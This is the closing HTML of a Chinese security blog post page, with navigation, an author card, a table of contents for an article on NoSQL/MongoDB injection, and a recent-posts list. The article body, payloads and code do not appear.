data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93.md/"><img class="prev-cover" src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225569.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2022年终总结.md</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/15/%E4%BC%81%E4%B8%9A%20SDLC%20%E5%AE%89%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/"><img class="next-cover" src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225559.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">企业 SDLC 安全生命周期管理</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zeo</div><div class="author-info__description">专注于安全,分享生活,分享知识</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">127</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/godzeo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/godzeo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:zzzhhhaaaiiii@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Weclome my blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-Nosql-inject"><span class="toc-number">1.</span> <span class="toc-text">0x00 Nosql inject</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-What-is-nosql"><span class="toc-number">2.</span> <span class="toc-text">0x01 What is nosql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-Nosql"><span class="toc-number">2.1.</span> <span class="toc-text">什么是 Nosql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Nosql-%E6%B3%A8%E5%85%A5%E7%9A%84%E7%AE%80%E4%BB%8B"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 Nosql 注入的简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84MongoDB"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 最常见的MongoDB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E8%AF%8D%E5%AF%B9%E6%A0%87"><span class="toc-number">2.4.</span> <span class="toc-text">单词对标</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-mongodb%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">0x04 mongodb的简单使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86"><span class="toc-number">3.0.1.</span> <span class="toc-text">利用账号密码登陆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.0.2.</span> <span class="toc-text">查看数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.0.3.</span> <span class="toc-text">当前数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.0.4.</span> <span class="toc-text">切换数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E9%9B%86%E5%90%88-%E7%9B%B8%E5%BD%93%E4%BA%8E%E7%9C%8B%E5%BA%93%E8%A1%A8"><span class="toc-number">3.0.5.</span> <span class="toc-text">查看集合(相当于看库表)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%9B%86%E5%90%88"><span class="toc-number">3.0.6.</span> <span class="toc-text">创建一个集合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E4%B8%80%E4%B8%AA%E6%96%87%E6%A1%A3%EF%BC%88%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="toc-number">3.0.7.</span> <span class="toc-text">插入一个文档（数据）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%B8%A6%E6%9D%A1%E4%BB%B6%E7%9A%84%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.0.8.</span> <span class="toc-text">查询数据，带条件的查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">3.1.</span> <span class="toc-text">靶场搭建</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-NoSQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">0x05 NoSQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E9%87%8D%E8%A8%80%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text">0x06 重言式注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.</span> <span class="toc-text">0x07 盲注</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/01/02/%E5%BA%94%E6%80%A5!linux%20%E6%8C%82D%E7%9B%BE%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95/" title="应急/linux 挂D盾扫描方法"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225566.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急/linux 挂D盾扫描方法"/></a><div class="content"><a class="title" href="/2023/01/02/%E5%BA%94%E6%80%A5!linux%20%E6%8C%82D%E7%9B%BE%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95/" title="应急/linux 挂D盾扫描方法">应急/linux 挂D盾扫描方法</a><time datetime="2023-01-02T11:49:32.000Z" title="发表于 2023-01-02 19:49:32">2023-01-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93.md/" title="2022年终总结.md"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225569.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2022年终总结.md"/></a><div class="content"><a class="title" href="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93.md/" title="2022年终总结.md">2022年终总结.md</a><time datetime="2022-12-31T03:17:07.000Z" title="发表于 2022-12-31 11:17:07">2022-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/28/Nosql%20inject%E6%B3%A8%E5%85%A5/" title="Nosql inject注入"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225559.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nosql inject注入"/></a><div class="content"><a class="title" href="/2022/11/28/Nosql%20inject%E6%B3%A8%E5%85%A5/" title="Nosql inject注入">Nosql inject注入</a><time datetime="2022-11-28T07:28:02.000Z" title="发表于 2022-11-28 15:28:02">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/15/%E4%BC%81%E4%B8%9A%20SDLC%20%E5%AE%89%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/" title="企业 SDLC 安全生命周期管理"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225559.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="企业 SDLC 安全生命周期管理"/></a><div class="content"><a class="title" href="/2022/11/15/%E4%BC%81%E4%B8%9A%20SDLC%20%E5%AE%89%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/" title="企业 SDLC 安全生命周期管理">企业 SDLC 安全生命周期管理</a><time datetime="2022-11-15T14:03:44.000Z" title="发表于 2022-11-15 22:03:44">2022-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/05/Go%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E(File%20Operation!Redirect!Cors)/" title="Go 代码审计漏洞(File Operation\Redirect\Cors)"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231217732.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go 代码审计漏洞(File Operation\Redirect\Cors)"/></a><div class="content"><a class="title" href="/2022/11/05/Go%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E(File%20Operation!Redirect!Cors)/" title="Go 代码审计漏洞(File Operation\Redirect\Cors)">Go 代码审计漏洞(File Operation\Redirect\Cors)</a><time datetime="2022-11-05T09:15:28.000Z" title="发表于 2022-11-05 17:15:28">2022-11-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2023 By Zeo</div><div class="footer_custom_text">Hi, welcome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div></div></body></html>
